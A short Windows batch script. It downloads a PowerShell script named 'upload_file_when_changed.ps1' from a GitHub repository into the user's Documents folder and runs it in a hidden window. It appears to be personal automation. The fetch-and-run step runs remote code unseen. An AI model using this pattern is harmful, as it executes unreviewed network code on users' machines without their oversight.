@echo off

REM Change to a different directory
cd "%USERPROFILE%\Documents"

REM Download file from GitHub
curl -L -o upload_file_when_changed.ps1 https://raw.githubusercontent.com/caydenwe/Racing-Documentation-to-CSV/refs/heads/main/upload_file_when_changed.ps1

powershell.exe -WindowStyle Hidden -File "%USERPROFILE%\Documents\upload_file_when_changed.ps1"
exit